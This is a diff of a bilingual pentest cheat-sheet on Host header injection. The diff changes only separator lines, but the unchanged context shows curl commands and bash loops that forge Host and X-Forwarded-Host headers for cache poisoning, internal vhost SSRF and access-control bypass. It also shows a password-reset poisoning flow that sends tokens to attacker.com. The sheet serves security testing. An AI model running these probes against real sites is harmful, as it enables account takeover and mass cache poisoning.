@@ -17,7 +17,7 @@ linked:
 ---
 # Host Header Injection - Vectores Comunes
 
-***
+---
 
 ## Password Reset Poisoning
 
@@ -49,7 +49,7 @@ Email: "Click to reset: https://attacker.com/reset?token=eyJhbGc..."
 Victim clicks → attacker logs token → uses on legit target → resets password.
 ```
 
-___
+---
 
 ## Cache Poisoning via Host
 
@@ -65,7 +65,7 @@ ___
 | Post-poison: víctima común `curl https://target.com/login` → recibe response con attacker.com en `<base>` | Mass victim impact via cached HTML | TTL del cache. |
 ^hhi-vector-cache
 
-___
+---
 
 ## SSRF a Virtual Hosts Internos
 
@@ -83,7 +83,7 @@ ___
 | `curl -H "Host: target.com.evil.com" https://target.com/` (server name match laxo) | Bypass strict Host validation | Regex sin anchor. |
 ^hhi-vector-ssrf
 
-___
+---
 
 ## Routing-Based Access Control Bypass
 
@@ -97,7 +97,7 @@ ___
 | `for h in localhost 127.0.0.1 admin admin.target.com internal trusted; do curl -sI -H "X-Forwarded-Host: $h" https://target.com/admin \| head -1; done` | Bulk Host-based ACL probe | Discovery. |
 ^hhi-vector-acl
 
-___
+---
 
 ## Email Link Generation Hijack
 
@@ -112,4 +112,4 @@ ___
 | `for ep in welcome share invite notification calendar doc/share unsubscribe receipt; do curl -X POST -H "X-Forwarded-Host: attacker.com" -d "..." https://target.com/$ep; done` | Bulk email-link endpoint probe | Discovery. |
 ^hhi-vector-email
 
-***
+---
